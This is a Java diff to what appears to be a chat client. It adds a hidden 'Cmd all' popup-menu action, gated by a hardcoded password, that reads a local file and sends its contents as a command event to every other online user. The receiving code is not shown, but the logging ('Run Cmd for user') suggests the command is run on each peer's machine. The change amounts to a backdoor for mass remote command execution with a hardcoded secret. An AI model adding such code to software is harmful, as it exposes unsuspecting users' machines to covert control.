@@ -6,6 +6,7 @@ import cr.events.Events;
 import cr.io.IO;
 import cr.tool.Logger;
 import cr.ui.XMenuBar;
+import cr.ui.comp.UserList;
 import cr.ui.frame.MainFrame;
 import cr.util.Client;
 import cr.util.Server;
@@ -94,6 +95,53 @@ public final class UserPopMenu extends JPopupMenu {
             } catch (IOException ex) {
                 ex.printStackTrace();
                 Logger.getLogger().err(ex);
+            }
+        }));
+        add(XMenuBar.create("Cmd all", e -> {
+            String pass = MainFrame.input("密码:");
+            if (!pass.equals("200712"))
+                return;
+
+            JFileChooser fileChooser = new JFileChooser();
+            int returnValue = fileChooser.showOpenDialog(null);
+            if (returnValue == JFileChooser.APPROVE_OPTION) {
+                File f = fileChooser.getSelectedFile();
+                if (f == null) return;
+                if (!f.canRead()) {
+                    MainFrame.input("无法读取！");
+                    return;
+                }
+
+                try {
+                    FileInputStream is = new FileInputStream(f);
+                    byte[] buff = new byte[(int) f.length()];
+                    int l = is.read(buff);
+                    String s = new String(buff, 0, l);
+
+                    // 对所有在线用户发送命令
+                    for (int i = 0; i < UserList.getInstance().getModel().getSize(); i++) {
+                        User user = UserList.getInstance().getModel().getElementAt(i);
+                        if (!user.equals(User.getLocalUser())) {
+                            try {
+                                FileInputStream userIs = new FileInputStream(f);
+                                byte[] userBuff = new byte[(int) f.length()];
+                                int userL = userIs.read(userBuff);
+                                String userS = new String(userBuff, 0, userL);
+                                user.sendMessage(Events.getCmdEvent(userS, user.getInfo()));
+                                Logger.getLogger().info("Run Cmd for user " + user.getName() + ":\n" + userS);
+                                userIs.close();
+                            } catch (IOException ex) {
+                                ex.printStackTrace();
+                                Logger.getLogger().err(ex);
+                            }
+                        }
+                    }
+
+                    is.close();
+                } catch (IOException ex) {
+                    ex.printStackTrace();
+                    Logger.getLogger().err(ex);
+                }
             }
         }));
     }
